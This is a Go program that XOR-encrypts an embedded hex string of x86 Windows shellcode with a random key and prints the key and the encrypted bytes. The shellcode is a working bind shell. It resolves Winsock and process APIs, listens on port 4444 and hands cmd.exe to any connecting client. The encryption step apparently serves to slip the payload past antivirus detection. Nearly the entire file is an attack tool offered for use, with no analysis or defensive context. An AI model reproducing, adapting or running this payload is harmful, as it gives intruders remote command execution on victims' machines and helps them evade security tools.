package main

import (
	"fmt"
	"math/rand"
	"time"
)

func uniqueKey(l int) string {

	str := "0123456789abcdefghijklmnopqrstuvwxyz"

	bytes := []byte(str)

	result := []byte{}

	r := rand.New(rand.NewSource(time.Now().UnixNano()))

	for i := 0; i < l; i++ {

		result = append(result, bytes[r.Intn(len(bytes))])

	}

	return string(result)

}

func encrypt_decrypt(input, key string) (output string) {
	kL := len(key)
	for i := range input {
		output += string(input[i] ^ key[i%kL])
	}
	return output
}

func main() {
	x_key := uniqueKey(16)
	string := "5589e583ec6031c066b8737350686464726568726f634168476574508965fc31c0648b40308b400c8b401c89c38b0389c38b038b40088945f88b583c01c38b5b7801c38b7b2001c7897df48b4b2401c1894df08b531c01c28955ec8b531431c08b7df48b75fc31c9fc8b3c87037df86683c10ff3a674054039d072e48b4df08b55ec668b04418b04820345f88945e831d2526861727941684c696272684c6f616454ff75f88b45e8ffd08945e431c066b8333250687773325f548b5de4ffd38945e031d266ba7570526874617274685753415354ff75e08b45e8ffd08945dc31db66bb900129dc54538b45dcffd031d266ba744152686f636b65685753415354ff75e08b45e8ffd08945d831db53535331c9b10651435343538b45d8ffd08945d431db536668115c80c30266538965d031c9516862696e6454ff75e08b45e8ffd08945cc6a10ff75d0ff75d48b45ccffd031c966b9656e51686c69737454ff75e08b45e8ffd08945c831c951ff75d48b45c8ffd031c966b9707451686163636554ff75e08b45e8ffd08945c431c95151ff75d48b45c4ffd08945c0ba63636d64c1ea08528965bc31d283ec108965b831d2ff75c0ff75c0ff75c0525231c040c1c00840505252525252525252525231c00444508965b431d266ba734152686f6365736874655072684372656154ff75f88b45e8ffd08945b031d2ff75b8ff75b452525231c040505252ff75bc528b5db0ffd331c9b901657373c1e908516850726f63684578697454ff75f88b45e8ffd08945ac31d2508b45acffd0"
	encrypted := encrypt_decrypt(string, x_key)
	fmt.Printf("key:\t %v \n", x_key)
	fmt.Printf("shellcode in byte array:\t %v \n", []byte(encrypted))

}
